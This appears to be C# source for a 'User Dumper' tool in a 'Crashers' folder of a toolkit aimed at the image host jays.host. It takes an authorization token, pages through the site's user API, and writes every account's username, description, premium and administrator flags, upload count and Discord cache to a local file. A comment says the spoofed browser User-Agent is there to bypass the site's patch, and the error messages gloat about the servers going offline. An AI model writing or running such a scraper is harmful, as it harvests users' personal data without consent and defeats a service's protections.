using System;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using static Colorful.Console;

namespace Jays.Host_Toolkit.Tools.Crashers
{
    public static class UserDumper
    {
        private static string _token;
        private static int _requestsSent;

        public static void Start()
        {
            tryAgain:
            try
            {
                Title = "Jays.Host Toolkit | Made by Verity | Version 2.0, Build 01/24/22 | Current Tool: User Dumper";
            
                Utils.LoadingSequence();
            
                WriteLine(" Token:", Color.DodgerBlue);
                Write(" --> ", Color.DarkSlateBlue); 
                _token = ReadLine();
                
                new Thread(Dumper).Start();

                Console.ReadLine();
            }
            catch (FormatException)
            {
                Console.WriteLine("\n Error, please enter the NUMBER of threads, its an integer not a string.");
                Console.ReadKey();
                Console.Clear();
                goto tryAgain;
            }
        }

        private static async void Dumper()
        {
            var count = 1;
            while (true)
            {
                try
                {
                    if (count != 19)
                    {
                        Title = "Jays.Host Toolkit | Made by Verity | Version 2.0, Build 01/20/22 | Current Tool: User Dumper | Requests Sent: " + _requestsSent;
                        var pageEndpoint = WebRequest.Create($"https://jays.host/api/v1/user?page={count}&search=");
                        pageEndpoint.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36 Edg/97.0.1072.62"); // Bypass Jays awesome patch.
                        pageEndpoint.Headers.Add("authorization", _token);
                        pageEndpoint.Method = WebRequestMethods.Http.Get;
                        var responseMessage = (HttpWebResponse)await pageEndpoint.GetResponseAsync();
                        var streamReader = new StreamReader(responseMessage.GetResponseStream());
                        var data = (JObject)JsonConvert.DeserializeObject(await streamReader.ReadToEndAsync());
                        var users = data!["usersArray"]!.Children();

                        foreach (var userinfo in users)
                        {
                            if (userinfo["discordUserCache"] != null)
                            {
                                Console.WriteLine("Username: " + userinfo["username"]);
                                Console.WriteLine("Description: " + userinfo["description"]);
                                Console.WriteLine("Premium: " + userinfo["premium"]);
                                Console.WriteLine("Total Uploads: " + userinfo["totalUploads"]);
                                Console.WriteLine("Administrator: " + userinfo["administrator"]);
                                Console.WriteLine("discordUserCache: " + userinfo["discordUserCache"] + "\n");
                                await File.AppendAllTextAsync(Environment.CurrentDirectory + @"\UserDump.txt", "Username: " + userinfo["username"] + "\n" + "Description: " + userinfo["description"] + "\n" + "Premium: " + userinfo["premium"] + "\n" + "Total Uploads: " + userinfo["totalUploads"] + "\n" + "Administrator: " + userinfo["administrator"] + "\n" + "discordUserCache: " + userinfo["discordUserCache"] + "\n" + "\n");
                            }
                            else
                            {
                                Console.WriteLine("Username: " + userinfo["username"]);
                                Console.WriteLine("Description: " + userinfo["description"]);
                                Console.WriteLine("Premium: " + userinfo["premium"]);
                                Console.WriteLine("Total Uploads: " + userinfo["totalUploads"]);
                                Console.WriteLine("Administrator: " + userinfo["administrator"] + "\n");
                                await File.AppendAllTextAsync(Environment.CurrentDirectory + @"\UserDump.txt", "Username: " + userinfo["username"] + "\n" + "Description: " + userinfo["description"] + "\n" + "Premium: " + userinfo["premium"] + "\n" + "Total Uploads: " + userinfo["totalUploads"] + "\n" + "Administrator: " + userinfo["administrator"] + "\n" + "\n");
                            }
                        }
                        
                        count += 1;
                        _requestsSent += 1;
                    }
                }
                catch (WebException e)
                {
                    if (e.Status == WebExceptionStatus.UnknownError)
                    {
                        WriteLine(" Servers Offline :)", Color.Green);
                    }
                    else
                    {
                        WriteLine(" Servers unreachable :) -> " + e.Message, Color.Green);
                    }
                    _requestsSent += 1;
                }
                Thread.Sleep(100);
            }
        }
    }
}